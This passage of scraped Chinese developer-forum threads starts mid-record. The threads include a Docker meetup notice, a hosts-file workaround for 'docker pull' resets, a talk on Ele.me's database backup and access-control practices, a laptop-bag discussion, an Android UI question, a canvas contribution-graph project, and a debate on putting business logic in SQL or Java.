src=\"https://p1.bpimg.com/4851/20766c1a9b68ad92.png\"></p>\n<p><strong>合作伙伴及媒体</strong>\n<img alt=\"\" src=\"https://p1.bpimg.com/4851/22be246f59b87715.png\"></p>\n</div></div>"], "reply": "12", "tittle": "Docker 四周岁了！快来一起为小鲸鱼点亮生日蜡烛吧！", "comment": ["还得上班，就算我在隔壁也没时间去。。 支持一个。", "请问是报名就一定能去的吗，还是要筛选，打算推了看赛车去的哦。", "3.19 重庆到成都有一起约得没？", "上海站就在公司旁边，去看看", "已报名，支持一个+1", "周六刚好去深圳参加哥哥的婚礼，必须资兹。", "已填申请～求带😉", "今年不来长沙了？", " 只要报了名就可以参加哦！", " 抱歉，今年暂无长沙站的计划～不过我们会把其他城市 Meetup 的干货分享在「道客船长」的公众号，欢迎关注哦！", " 收到短信了。谢谢： P 不过没有名片怎么破。。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>例如：</p>\n<pre><code>$ docker pull ubuntu:16.04\nTrying to pull repository docker.io/library/ubuntu ... \nGet https://registry-1.docker.io/v2/library/ubuntu/manifests/sha256:dd7808d8792c9841d0b460122f1acf0a2dd1f56404f8d1e56298048885e45535: Get https://auth.docker.io/token?scope=repository%3Alibrary%2Fubuntu%3Apull&amp;service=registry.docker.io: read tcp *.*.*.*:41348-&gt;50.17.62.194:443: read: connection reset by peer\n</code></pre>\n<p>原因：\n目测 50.17.62.194 被 TCP RESET 。</p>\n<p>解决方法：</p>\n<ol>\n<li>找到其它可用 IP ：</li>\n</ol>\n<pre><code>$ dig auth.docker.io\n\n; &lt;&lt;&gt;&gt; DiG 9.10.4-P6-RedHat-9.10.4-4.P6.fc25 &lt;&lt;&gt;&gt; auth.docker.io\n;; global options: +cmd\n;; Got answer:\n;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 7119\n;; flags: qr rd ra; QUERY: 1, ANSWER: 3, AUTHORITY: 0, ADDITIONAL: 1\n\n;; OPT PSEUDOSECTION:\n; EDNS: version: 0, flags:; udp: 4096\n;; QUESTION SECTION:\n;auth.docker.io.\t\t\tIN\tA\n\n;; ANSWER SECTION:\nauth.docker.io.\t\t60\tIN\tA\t34.193.147.40\nauth.docker.io.\t\t60\tIN\tA\t50.17.62.194\nauth.docker.io.\t\t60\tIN\tA\t52.5.246.212\n\n;; Query time: 130 msec\n;; SERVER: *.*.*.*#53(.*.*.*.*)\n;; WHEN: Tue Mar 07 11:03:29 CST 2017\n;; MSG SIZE  rcvd: 91\n</code></pre>\n<ol>\n<li>改<code>/etc/hosts</code>强制 <a href=\"http://docker.io\" rel=\"nofollow\">docker.io</a> 相关的域名解析到其它可用 IP ：</li>\n</ol>\n<pre><code># /etc/hosts\n34.193.147.40 registry-1.docker.io auth.docker.io\n</code></pre>\n</div></div>"], "reply": "7", "tittle": "解决`docker pull`被 reset 的问题", "comment": ["registry 在国内连接总是各种问题，不知道是不是墙在作梗，先 mark 下", "在墙内， 10 次 pull8 次 timeout2 次 reset", "ss -> polipo -> HTTPS_PROXY\r", "or 自建海外 registry 私用 + tag / dns 强制解析\r", "or 国内海量的 registry-mirror ，高校的比如 tuna 或者 ustc ，不过 gcr.io 好像没找到替代的。", "\r", "\r", "网易的镜像", " 我这边翻墙也是一样的", "HTTP_PROXY=socks5://localhost:5000 docker pull ~~~\r", "\r", "ref: ", "\r", "或自己 vps 搭建 docker cache registry"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><a href=\"shurenyun.com\" rel=\"nofollow\">数人云</a>“告别人肉运维”上海 Meetup 的实录第二弹来啦！本次分享的嘉宾是饿了么 DBA 团队负责人虢国飞。实录将从用户访问、数据库架构体系、数据备份、数据流转和数据操作等几个方面介绍饿了么目前在数据安全方面的一些措施。</p>\n<p><img alt=\"\" src=\"https://i.v2ex.co/gb7QaSQk.png\"></p>\n<p><strong><em>虢国飞 / 饿了么 DBA 团队负责人</em></strong></p>\n<p><strong>从事数据库领域 10+年，主要关注于数据库管理自动化建设和 MySQL 、 Pg 、 MSSQL 、 NoSQL 等领域的研究。</strong></p>\n<p>本次主题关于数据安全的保障。前面的引子是 Gitlab 数据库出现问题，它有五重的数据保障，但都失效了。开始之前有几个问题：</p>\n<ol>\n<li>在座很多是做运维或数据库工作的，现在公司数据库有备份吗？</li>\n<li>如果数据库有备份，多长时间做一次还原测试来验证数据库的备份是不是有效？</li>\n<li>有没有一个月之内做一次整个备份检验的？在一个月之内做一次，比如一年做十次或者十二次还原检验？</li>\n</ol>\n<p>带着上面的疑问，我分享一下饿了么在数据安全上所采取的一些措施，包括备份和还原的方式，与大家一起探讨。</p>\n<p>本次活动主题是如何减少人肉运维，让数据库运维和业务运维实现自动化。为什么做到保持有备份，并且验证备份有效的公司不是那么多呢？关键在于资源，资源不光包括硬件资源，也包括人力资源。如果通过人肉方式时刻保证整套系统持续有效运作，成本相当高。</p>\n<h2>数据访问</h2>\n<p>数据在入到数据库之前，可能会面临一些注入的攻击甚至拖库等风险。用户访问数据库的时候，饿了么有一个中间层叫做 DAL 层，如果做一些分库分表的应用很多时候都会运用这一中间层软件，开源软件有此类功能的也很多，像 mycat 、 atlas 等。</p>\n<p><img alt=\"\" src=\"https://i.v2ex.co/x39H4Cnc.jpeg\"></p>\n<p>在这一层，饿了么做了一些数据方面相关的保护。首先，因为有中间这一层，所以在底层数据架构方面对研发或者对外都是一个不透明的状态，拿不到具体数据库 IP 地址，我们只把这些敏感的信息开放到有限的一些人的手里；第二层面，在 DAL 层把一些敏感的信息全部加密掉，比如用户名、密码这种访问数据库的信息；第三，会对风险的 SQL 做一些限制，比如一次要拉一百万数据的 SQL ，是不支持的，或者想 drop 一个表，这样的风险动作都会屏蔽掉。</p>\n<p>饿了么对外开放的一些权限在账号部分也做了限制：</p>\n<p><strong>首先</strong>，每个业务都是专用的账号，不会多业务共用一个账号；</p>\n<p><strong>第二</strong>，账号权限是最小的，一般就是增、删、改、查，有的甚至是只有增、改、查三个权限，删除权限都没有，所以账号风险是最小化。还有一个是对内网的网段去做限制，在账号赋权的时候限定它能访问的网段；</p>\n<p><strong>第三</strong>， SQL 限制讲过， DAL 层会做一些相应的限制，在数据库一层也可以去做，比如一些更新的 SQL 是不带条件的，这时可以限制掉，包括删除的动作。如果没有带条件，这个风险是很高的，一般认为都是有问题的，所以这部分风险会在数据层去屏蔽。</p>\n<p>在数据访问上，主要把信息进行一个屏蔽以及加密，以及对权限和操作的动作做了一层保障。 DAL 的架构在中间层，也是相当于对数据库提前做了一个访问控制和负载均衡层，当然它的功能不止这一点，还包括刚刚说的路由，一些紧急 SQL 的屏蔽等。</p>\n<h2>数据流转</h2>\n<p><img alt=\"\" src=\"https://i.v2ex.co/VXthhr7P.jpeg\"></p>\n<p>数据进来之后会面临各方需要使用数据的问题：\n首先，在 DAL 这层进到生产数据库的时候，在入口这一端做限制；\n第二，数据落到相应 BU 生产数据库的时候，如果这些数据要给其它 BU 去访问，数据应该如何提供？目前比较通用的方式是通过接口，某个 BU 去调用其他 BU 一些相应的业务接口提去数据。如果接口提供不了的话，跨业务的访问也走 DAL 层， DAL 会把所有访问的痕迹记录下来。对于生产的数据，现在有很多研发会要求在他们的 alpha 和 beta 环境去做压力测试，要同步生产的数据，还有需要查生产的数据，但这些数据可能包含敏感数据，怎么办？</p>\n<p>饿了么开发了一个 DBQuery 的软件。对研发来说 DBQuery 能提供能查生产的数据，然后导出生产的数据，同时还能够把数据同步到其它的环境，但是这些操作都是受限的。首先它能操作的数据量是有限的，一些敏感的记录会做脱敏的处理，所有研发人员在上面所做的操作都会被记录下来，例如在上面做的导出动作、拉取数据、查询等。如果是这个平台本身不能支持的需求，那么会联合 DBA 和安全团队去做把关，比如要对第三方提供一些大数据量的数据，这样会有安全的保障。所以数据流的控制从入口，跨业务团队的访问，以及到不同的环境数据同步，包括研发想查看的这些记录，都会记录下来它的操作，以及对这些操作做相应的限制。</p>\n<h2>备份还原</h2>\n<p><img alt=\"\" src=\"https://i.v2ex.co/aHKpRT63.jpeg\"></p>\n<p>DBA 最重要的一个责任——数据库的备份和还原。饿了么的方案和大家所知道的或所了解的都差不多，但是如何把它做到或者更好的做到，各个公司都会不一样。饿了么有全量、增量、以及 Binlog 的备份，然后会拷贝到 Ceph 做保存，包括本地的备份和远程的备份。关键的第三点，它能够完成自动的部署、运行和监控。一个业务上线的时候，因为有标准化，上去之后，备份就自动跑，如果没有备份，就会收到告警。运行得正不正常，或者备份中失败了，或者没有运行备份，都可以通过监控的一个界面看到情况，备份的时长以及什么时间点去做的、在哪些机器上去做的，都是自动在后台运行的。</p>\n<p>数据还原也是如此，有一个循环的周期。饿了么重要数据验证周期是 15 天。因为有好几百套 DB ， 15 天到一个月，重要的是 15 天会验证一次，一个月周期的是不太重要的一些业务，都会在循环的周期去做验证。验证除了检验备份的可靠性以外，还有一个目的，即拿到数据还原的时长。研发或者领导会问如果现在某个数据库出现了问题，多久能够找回来或者还原回来数据？这些都是需要数据支持的。它还可以去抽样，除了它自己循环去检测的，可以随时拉一个库出来，还原到哪个时间甚至哪个点位都是可以的。饿了么通过平台去实现，不需要找机器、再找被分在哪里，只要告之要还原的是哪个库，想还原到什么样子，维护成本很小。</p>\n<p>上图右侧截图里有一些应用的时间以及它的状态是成功还是失败。</p>\n<h2>DBA 操作</h2>\n<p>除了在防范数据入口的时候对业务的数据进行一些控制，还要在底层做一些备份还原保障，另外 DBA 的一些操作对数据安全也相当重要，这部分出问题的情况也不少。在如何保证 DBA 操作的安全方面，很多公司都会有各种各样的军规。</p>\n<p>类似的军规饿了么也有，但现在慢慢淡化，因为军规是与人相关的因素，特别不可控，饿了么之前做军规的时候把那些操作的风险都分了不同的类，一个要求是能保证操作的时候能够快速的回滚，举个例子，比如清空一个表的数据应该如何做，因为有时风险很大。我们的处理方式是先把这个表去 rename 一个待删除的表，放一周之后会有自动的任务再去清理这个表。如果操作的时候出现问题，那可以马上让它 rename 恢复过来。还有一个限制是风险操作在操作的时间上做限制，不能在业务高峰时间去做这些动作，是有一个维护的窗口期，在业务的低峰期才去做。这样能够保证一旦出问题损失最小化，虽然我们能够快速恢复，但是如果在高峰时间操作其影响仍然很大，如果选择有维护窗口期的话，损失是最小的。</p>\n<p>之所以讲淡化军规是因为现在饿了么想做工具化，这个工具里最重要的是把高风险操作的流程步骤固化到工具里面，让工具去操作，人就不用太在意操作的流程是不是 OK 的。有些做不到的流程，它也会提示出来有什么风险，操作的时候会给 DBA 一个相应的警告。工具化之后，很多操作就可以在后台自动运行了</p>\n<p><img alt=\"\" src=\"https://i.v2ex.co/xOf4uC4w.jpeg\"></p>\n<p>以上实际在生产上面跑的一些需求，红色的部分大部分是自动执行的，因为平台上线的时间才几个月，之前这部分全是 DBA 在操作的，现在有很多任务 DBA 不需要自己操作，由后台的系统任务去调度起来，基本上没有风险，所以需要关注的点就变得越来越少了，人力也可以解放出来把这个平台做得更好。饿了么今年正在做一个开发的自助平台，设计的目标是研发能够在上面完成数据库的一些操作，包括数据归档，加表等动作，符合平台验证规则的话 DBA 不需要干预。</p>\n<h2>架构保障</h2>\n<p><img alt=\"\" src=\"https://i.v2ex.co/8bs7YQV4.jpeg\"></p>\n<p>上图是饿了么现在架构的情况。首先有两个机房， A 机房和大家主流的部署架构差不多，即主从的一个架构。有一台特殊的机器 DS （ DelaySlave ），它会保持与生产数据的数据同步有一个时差，比如它会延后一天或者是半天的时间、 12 小时，如果生产操作出现了问题，就可以快速的通过它回放到操作前的一个点把这些数据找出来。这样的恢复速度是最快的，追回的时间仅要几分钟。它不光提供半天之内数据快速恢复，而且饿了么的备份也都在上面做，这样备份的时候不会影响到生产运行。哪怕这台机器上跑很多的备份任务都不会影响，因为它主要是做数据的备份，而且监控就是在标准化部署这一台之后，所有的备份任务和监控程序都会自动与它做匹配，所以只要完成这一架构的搭建，接下来的事情系统自动去做，也不需要人肉干预。如果它没有备份成功或者备份失败或者跳过了备份，在监控备份和还原监控里面都会得到体现。</p>\n<p>下面这是做还原的一部分机器，我们是循环周期去做还原的，所以它在一个周期内必定会完成这些库的校验，验证它的备份是否有效。在另一个机房，中间有一个组件叫 DRC ，这个软件最初淘宝做得比较多，即跨机房的一些数据的同步。它提供了数据同步和订阅的功能，监听数据库状态的变更，而且在多机房之间同步的时候可以做很多动作，比方如数据的压缩、过滤，还有刚刚提到的数据订阅，出了问题它可以上报。此外，有一个特殊的机器叫 QS ， DBQuery 服务的功能就部署在它上面，在上面会完成研发对数据的查询以及数据从它到各个环境的导入、过滤和脱敏。</p>\n<p>从整个架构体系对数据的保障来看，一是有多机房，二是主从的 HA ，以及 DelaySlave 和一些备份机制。从数据入进来到 DAL 层、到数据库里面针对一些账号权限的限制以及架构的保障和备份、还原体系的完善以及 DelaySlave 的延迟备份来保障饿了么整个数据的安全，这样的架构体系为数据安全提供了多层保障。</p>\n<h2>总结</h2>\n<p><img alt=\"\" src=\"https://i.v2ex.co/YZe34FoX.jpeg\"></p>\n</div></div>"], "reply": "6", "tittle": "活动实录|拒绝\"删库到跑路\"，探究饿了么数据安全保障体系", "comment": ["虽然不懂，但感觉很叼。", "大致都懂，但是具体实现起来需要技术啊", "DAL 目前怎样，老徐啥的还在不？", "ele.me 连不上， 倒闭了吗？", " 看来运维要背锅了，，，", "蛮不错的，都是实战经验。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>一个是 tumi 的 thinkpad 定制款，一个是 knomo 的双肩包（四四方方的那个），不知道怎么传图，放个外部链接看看吧，二选一，放 macbookpro13 、 QC35 、 kindle 、 2 本书、 3 只笔、小部分杂物，哪个更合适？定下哪个用 3 到 5 年就不用换别的包了</p>\n<p>knomo 双肩包： <a href=\"http://dwz.cn/5s3az1\" rel=\"nofollow\">http://dwz.cn/5s3az1</a>\ntumi thinkpad 定制： <a href=\"http://dwz.cn/5s3faY\" rel=\"nofollow\">http://dwz.cn/5s3faY</a></p>\n</div></div>"], "reply": "61", "tittle": "公文包二选一，大家来帮忙看一看", "comment": ["1k 以上还是建议买个皮的，不仅看起来高端，而且越用越有感觉，布包只会越用越旧，不会像皮包那样有岁月的魅力。", "这要看人，不是看包..完全没别的意思...如果纯看包颜值的话 我会选第一款 knomo    第 2 个定制那个 太制式了..一般公务都是这款类型...", "必须 tumi", "我记得楼主一开始预算是 500 来着，越加越多了Ծ ̮ Ծ", " 到不了 1k ， 700 以下就 OK", "买皮的吧， tumi 样子太屌丝了，第一个太学生气了。预算有限的话可以看看网易严选的皮包。", " TUMI 的品质确实太好了，但是 knomo 的做工也是非常不错，好难选", " 对， knomo 更时尚，如果出席正式场合的话不知道和不合适", " 是啊，越来越多了没办法", "我想说，第一个，从后面看，个人觉得有点难以接受。除非你腰窄。", " 为什么难以接受呢？", " 严选的看过了，怎么说有点板，这款的 tumi 比较丑也确实， knomo 的看起来很学生气吗？", "第二个太丑了，不认识 tumi 的根本不会相信那货值 1K+", "一个公文包一个双肩包，怎么比较。另外第一个明显是楼主看了 smzdm 的推荐之后选的吧。", " 我看过有人背过，包很漂亮，但是背起来感觉并不潮，反倒有点像泰囧里黄渤背包的样子。然后就难以接受了。", " #14 我是说 knomo 双肩包是看了 smzdm 的推荐选择的吧。这个包个人感觉有点学生气，如果是商务人士西装革领的就太违和了。", " 或许会认为是科技市场买电脑给送的吧？", " 是从知乎找过来的", " 坦白讲是的，弹道尼龙还是黑色的跟买电脑送的包看起来没两样\r", "预算上千，建议 lu 个皮质的", " 皮的没有什么好的选择，刚才看了下网易严选，有网友买过的反应客服说这里的皮包都是二层皮，也就是 PU ，那质量肯定还不如非皮的了", " ", " 看下这个网易严选顾客的评价， PU 皮真的不敢买了", " 有没有品牌或者关键字的推荐？", "TUMI 的话推荐他家的 BEACON HILL", " 布包也有好看的\r", "\r", "![]( ", " )\r", "![]( ", " )\r", "![]( ", " )", " 用三年，看看帆布包是什么样子。再看看十几年的皮包是什么样子", " 你用的是古董 不好比", " 超预算了", " 什么包就算用十几年也早就用够了", " filson ，超预算了", " 那你看看 filson 帆布包吧", " 囧 刚看到楼上你说超预算。。。", " 不一定非得要帆布的", "都不好看！\r", "而且 Tumi 的包自重多。\r", "\r", "而且为什么是帆布的...质感差好多啊！", "都不好看要我我就买个 timbuk2 挎着", "Coach 的皮包还可以吧 虽然这个牌子可能在某些人眼里比较低端 但那种不是满身 C LOGO 的皮包还可以", " 帆布的比较便宜吧，这个价位不知道还能有什么推荐", " 装东西太少了，而且穿商务装不合适", " 两三千的也叫低端。。。。跟土豪们没法比啊", " 因为很多人听到 Coach 都会露出不屑的眼神啊 都是被那种满身 C LOGO 的帆布买菜包弄成这是一个低端品牌的印象了😂", "也可以张大妈看看 Floto", " 是 CC 吧，香奈儿的各种山寨，满大街的那种", " 香奈儿是相反交叉的双 C coach 是相对相接的双 C", "filson filson filson 说三遍", "包这个，一来要看用途（商务？休闲？）；二来要看尺寸（高个背小包或者矮个背大包都不合适）", " filson 的那个包，身高 1.75 以下的不推荐。。", " 就是商务用，双肩单肩都可", " 淘宝 许仙家 Bellplan ，网易公文包版型改的，有惊喜", " 我有这个包，不是真皮的，就是容量一般，放个 mac 可以\r", " 搜不到，结果是这样： ", " 这个是 PU 的，不知道能用多久，你的用多久了？有没有出现掉皮的现象？", " ", "\r", "\r", "利益相关： 买家", " 空包就死沉…再加上笔记本，每天背着挺需要毅力和体力的。", " 背电脑还是得双肩包", " 看到了非常好，太感谢了", "买了 knomo.容量大.除了容易脏.其他的还好.", " 嗯基本确定是这个了", "knomo 感觉款式简单，第一眼是很相中的~", "背 mac 是不是还得买个内胆包=。=", "玛德  不是说好的 it 男吗，选个包就炸出一堆什么鬼 。。。。。。。。。。", " 平时不常用，不知道耐不耐"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>下拉悬停对单手操作非常友好啊</p>\n<p>但是安卓阵营只有锤子和魅族有下拉悬停</p>\n<p>其他品牌为什么不抄过来呢？</p>\n</div></div>"], "reply": "29", "tittle": "下拉悬停这么好的功能，为啥安卓大厂都不搞呢？", "comment": ["因为安卓跟苹果不一样，会有人喷", "专利。", " \r", "啥叫安卓和苹果不一样？\r", "从时间上来说，也是我大魅族先出的吧？\r", "苹果不是抄的么？", " \r", "在中国，这种软件操作性质的东西，专利根本没用吧", " 他的意思就是苹果抄没人喷，其他。。。", "下拉悬停是什么来的", "跟为什么不把指纹 Home 都做成圆形一样", "你觉得苹果的下拉悬停好，但我觉得小米的单手模式更好，所以为什么一定要抄呢？", "很多地方的下拉逻辑是刷新", "魅族的下拉悬停就是个大坑，跟下拉刷新逻辑冲突，开发的时候非常崩溃", " \r", "下拉的方式不一样，锤子是用拇指肚拉", " \r", "魅族的下拉悬停还需要 app 单独支持么？", " \r", "下拉悬停不是苹果发明的\r", "单手模式也还不错，我以前确实不知道", "即使悬停了，单手点对角还是很难，还是单手模式吧", "其实 vivo 也有—>—>", "有人觉得好 也有人觉得不好 比如我", "下拉悬停就是一半屏幕那个？", "Windows Mobile 按住 Win 就下降半屏，感觉也挺好的。", " 这位 @", " 所说的下拉悬停和楼主所说的下拉悬停不是一个东西\r", "楼主说的下拉悬停是全屏下拉，而在良久以前，魅族有过一个尝试，就是把列表这样有滚动的操作的控件做一个局部的下拉悬停，就是只针对控件的，但是公用一个下拉事件，确实会和下拉刷新起冲突。\r", "印象中从 MX3 以后就抛弃了这样的方式，转为全屏下拉悬停了。\r", "虽然不知道专利上谁先谁后，但我感觉好像是锤子率先发布出来的，魅族几乎是同期发布的。", "感觉锤子系统的贴一大块肉是个很好的操作，不知道为什么别人都没有用这个？", " 不冲突啊， Flyme 6 现在是通过悬浮球来操作的，和用户下拉 View 操作隔离的。\r", "\r", "![]( ", " )\r", "![]( ", " )\r", "![]( ", " )", " ![]( ", " )", " 不需要，是系统级别的。", "也是双向选择吧，不一定是什么好大家就一定要做，什么不喜欢就要消失。", "抄过来会被喷，不抄也会被喷，无敌了。", "只有我觉得下拉悬停没卵用吗？", "额。弱弱的问下为啥专门不全屏？为了左上的返回按钮嘛。。可是有返回键啊。", " 现在已经这么高级了。。。好吧。。。我印象的 flyme 还停留在 3.x 。。。。很久没用魅族了。。。", " 原来如此。。。主要是很久没用魅族做测试机了，所以现在 flyme 的最新版改良的内容却是不了解了。。。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>大二的时候，自己想要批量下某个作者的图，写了个抓 pixiv 图的工具，结果后来自己都懒得用这个工具了</p>\n<p>后来自己买国外的东西，写了一个代购平台对比工具，嗨呀，微博转了 9000+，结果写完自己就没用过，因为写完就对这些平台的优点缺点都了如指掌了。。。</p>\n<p>后来，又用 electron 写了个 ps4 换壁纸的工具，之后自己用过了一次之后，就再也不需要用了</p>\n<p>今天又写了个拿 canvas 展示 github contribution 的东西，发现写完用好之后挂在自己 blog 上就没有用武之地了😂</p>\n<p>所以看看我写的这个 canvas-contribution 吧</p>\n<p><img alt=\"default\" src=\"https://ooo.0o0.ooo/2017/03/07/58be9a01af02d.gif\"></p>\n<p>与 github 的那个 contribution 相比，有如下优点</p>\n<ul>\n<li>tooltip 有了动画</li>\n<li>2 倍作画支持 retina</li>\n<li>可自定义颜色</li>\n<li>可传自定义数据</li>\n</ul>\n<p>自定义效果：\n<img alt=\"custom\" src=\"https://wx3.sinaimg.cn/large/6b8bbe7egy1fdeiab180fg211p0af4qt.gif\"></p>\n<p>因此用来显示 发微博频率 / 时间线更新频率 这样的显示，所以我拿他做了一个 <a href=\"http://bangumi.tv\" rel=\"nofollow\">bangumi.tv</a> 的 timeline 次数，也就是 bangumi activities ，显示每日看番频率</p>\n<p>github 与 bangumi 的 live demo 可以移步<a href=\"https://blog.xingoxu.com/about/\" rel=\"nofollow\">我的 about 页面</a>拉到最底下看</p>\n<p>我的 github 数据与 bangumi 数据是自己服务器上每日定时抓取</p>\n<p>github\n<a href=\"https://gist.github.com/xingoxu/d4eda57d2b164585827fb3c9a825bed7\" rel=\"nofollow\">https://gist.github.com/xingoxu/d4eda57d2b164585827fb3c9a825bed7</a></p>\n<p>bangumi\n<a href=\"https://gist.github.com/xingoxu/9f682d4d002f87d18ff43b95fa4d2959\" rel=\"nofollow\">https://gist.github.com/xingoxu/9f682d4d002f87d18ff43b95fa4d2959</a></p>\n<p>Q: 那么这么漂亮的 js 该在哪里下呢？</p>\n<p>A: 项目地址： <a href=\"https://github.com/xingoxu/canvas-contribution\" rel=\"nofollow\">https://github.com/xingoxu/canvas-contribution</a></p>\n<p><strong>One more thing:</strong></p>\n<p><img alt=\"\" src=\"https://ooo.0o0.ooo/2017/03/07/58be9f4117f3b.png\"></p>\n</div></div>"], "reply": "2", "tittle": "发现自己做的东西没人用 没人看 完了过一段时间自己都不用了", "comment": ["星星已送，不谢。支持一下，小兄弟，加油！", "挺有趣的, 已 star"]},
{"content": ["<div class=\"topic_content\">因为现在项目数据处理量比较巨大，他以前是程序员，我感觉他希望我写的功能，全部用 SQL 处理，他觉得 SQL 的速度是最快的，导入的时候有个数据校验，因为比较复杂，情况多，这种，我选择用 JAVA ，今天因为谈到这个逻辑，我说出来，他说，你怎么以前不说，现在才说，说我这个处理数据最起码 10 分钟（一定要我用 SQL 分出情况来，我的天，我得写多少个 UPDATE 进行情况分类），结果 18S 以内还是本地机，服务器应该 10S 左右。我现在很多业务逻辑都用 SQL 处理，我非常不喜欢这种处理方式。\r<br>  求解 SQL 处理业务逻辑优于 JAVA 吗？我觉得不优于，但是我们这边的业务负责人总是认为我刚毕业，结果我们部门来了几个所谓 3 年-5 年的，真心的，改前端复杂的请求修改，都是我找到方法，后端关于框架的一些问题基本上都是我解决的，也不是什么很难的问题，但是我真心超级烦\r<br>  连续走了 3 个技术负责人，其中 2 个都是和业务负责人有矛盾，当然 2 个技术经理也是有点技术不过关或者情商不够，所以根本没有技术负责人和他将技术，他总是按照他很多年以前的技术来认为 JAVA 很垃圾，速度慢， CPU 占用大之类的</div>"], "reply": "43", "tittle": "SQL 处理业务逻辑优于 Java 处理业务逻辑吗？感觉总是被业务负责人鄙视", "comment": ["连续走了 3 个技术负责人，其中 2 个都是和业务负责人有矛盾，当然 2 个技术经理也是有点技术不过关或者情商不够\r", "\r", "推荐楼主把 3 个变成 4 个。", " 没有技术负责人了，因为我们属于乙方，类似于外包，但是比外包好一丢丢，走了一个之后，后面连续跪了 2 个技术负责人，直接就不招技术负责人了。因为公司部门合并，本来借调，结果变成转部门了，待遇相对来说会好一点，但是我是一定要走了，我真心受不了这个业务负责人了，一直在找工作，想找那种可以安心做 2 年以上的那种标准找的，结果发现根本没有面试，发面试邀请的基本上我都不想去，蓝瘦，现在只想换家互联网公司了，今年投了这么多简历，好不容易有一份面试，降工资就降了，后悔当时的表现了。", "标准答案不是看业务场景么", "恰恰相反。 sql 中尽量少的逻辑，甚至有时候一个 join 都需要拆到 java 中先业务处理，然后写成 2 条简单 sql 处理。\r", "原因如下：\r", "1.业务逻辑都在 sql 中，数据库将成为瓶颈。且数据库做分布式集群是比较困难的。而业务系统就相对更容易做分布式集群处理。\r", "2.简单多条 SQL 的效率可能远大于一条连表查询 SQL ，详见 MySQL 权威指南等书籍。\r", "3.业务逻辑在 java 中，能够保持扩展性、容错性等等，而 sql 中，连迁移数据库都是件头疼的事情，更别提扩展了。\r", "\r", "。。。等等", "越复杂的逻辑越应该从 sql 里面剥离出来, 放到代码里面\r", "先不说效率问题, sql 长代码一时爽 日后维护的成本太高了", "这东西得看，不能一概而论。跟业务，跟数据库本身，都有一些关系。", "fsadf", " 维护真心要爆炸，还好现在又简了需求，之前因为加了个需求并且是需要分组的，结果有一个很小的一个方面没考虑到，炸了", " 虽然我现在对 SQL 很反感，但是还是觉得 SQL 处理有些逻辑还是可以用的，跟 @", " 他说的一样", "到时候天天整理慢查询 SQL 就蛋疼", " 项目小，不复杂，你写那里都无所谓。\r", "\r", "我们这个是入开发手册的， sql 运算、逻辑都不允许。简单逻辑你直接 mybatis 里处理，别放 sql 里啊。 sql 里不能有逻辑，我觉得应该不论什么情况都是正确的！", "从某种角度说， CPU 能跑满也算是个好事，毕竟没卡在 IO 上…", "如果业务逻辑简单，且在可以预见的几年内不会出现性能上的担忧， SQL ，存储过程写多复杂都无所谓的。\r", "如果可以预见未来需要分布式，需要对性能进行考量，需要对业务逻辑进行平凡修整，还是在代码里面比较好。", "高计算量的放 JAVA 里面挺好啊，高 IO 的放 SQL 也不错。。。看情况吧", "4 楼已经把能说的都说了， LZ 你看着办吧", "我们这边也不允许 SQL 中有逻辑。包括存储过程、触发器等。", "- 如果是对数据的约束，更适合放到 SQL （保证最终的数据符合约束）\r", "- 如果逻辑复杂到难以用 SQL 表达，更适合放到应用（毕竟 SQL 表达能力不如通用语言强）\r", "- 如果是 IO 密集，且必不可少的工作，更适合放到 SQL （减少传输量和对数据的反复扫描，但前提是这个工作「必不可少」，不能因为放到 SQL 中来做而增加无意义的工作）\r", "- 如果是计算密集，更适合放到应用（应用更容易进行横向拓展）", "sql 能处理的一些简单逻辑肯定是比查询完出来处理效率要高的，不过具体的肯定要看场景来定的\r", "\r", "不够确定就是 sql 的里面的逻辑不容易测试和调试，所以不用也没有问题，具体还是要看情况。", " 然后写个 while(true) {}?", "业务逻辑一定要尽可能不往 sql 里放。\r", "调试，兼容，分布式，可维护性，扩展性...\r", "我觉得在这一点上不存在“分情况看待”的必要。\r", "\r", "现在对数据库使用的主流方向是只用来存储数据，越来越多的项目都强制规定对于像存储过程、定时器、触发器都不允许使用。甚至外键都不允许使用。\r", "\r", "如果要问为什么不用，请先问为什么要用，数据合理性在业务代码层面就要得到保证。", " 这个就太极端了，就算业务代码层面就要保证数据没问题，在数据库里多一层限制 /校验有何不可？", "传统企业级应用和互联网应用是非常不同的技术处理路线，露珠对数据库很熟吗？达到 dba 水平没？别提 MySQL 这个垃圾，至少也得是 Oracle SQL server 这种企业级数据库", " 业务逻辑放外面也就分布式上占点优势，其他谈不上特别的好处，反而是开发人员自身背景和偏好的影响更大些。", " 那只是你们的开发手册。要说逻辑复杂，金融, 电信，这两个行业是 sql 使用的重灾区，难道属于业务逻辑简单的类型？", "我以前帮一个项目优化性能，有一个小伙子是搜狐出来的，动辄就是我们在搜狐是如何如何做的，如何如何地快，分表分库缓存一堆巴拉巴拉。最后我帮忙设计的方案完全没用互联网企业那套，他那套方案连评审都过不去，无他，业务场景不同。 MySQL 这么垃圾的数据库也就互联网企业敢用", " 业务逻辑也分前端业务和后端业务, 不同行业差别很大, 肯定要看情况的", "做 benchmark 看看？", " 非常同意你的观点。存储过程、定时器、触发器 个人建议能不用尽量不要用。\r", "\r", "业务逻辑尽量在代码里面完成，数据库这边尽量不要涉及业务逻辑，这应该是一个基本要求吧。。", "程序可以很容易知道操作是不是并发的，数据库我可不知道，万一锁表了那就堵塞了。", "懒，不想自己做。", "对传统企业级业务逻辑来说：十几年后 SQL 还是那个 SQL ， Java 或许面目全非了（语言，框架， IDE 工具等等）。不过 SQL 写逻辑一坨一坨垃圾一样的代码，复杂点的更是写的想死。\r", "\r", "Java comes and goes, but SQL stays forever ;)", " 重灾区并不能说明其是合理的。银行与电信重度依赖 sql 更多的是因为早期系统更多的依赖动辄百万性能强劲的小型机和 oracle 数据库，这在当时的性能确实比 java 虚拟机中的程序来的快。", "我司也是重代码逻辑，轻 sql 逻辑\r", "真的需要性能的情况下都是直接打 mysql 的 patch ，特定场景专门优化\r", "\r", "看到有同学提到了存储过程，我想了解下存储过程的版本管理是怎么做的，以及存储过程的版本管理怎么与代码的版本管理结合", " 存储过程也是代码，代码怎么做版本管理，存储过程就怎么做管理。把存储过程弄到生产数据库里编译，那是代码发布的阶段了。", "请用上企业版的 orcale ， sql server 了再来说数据库性能，功能。", 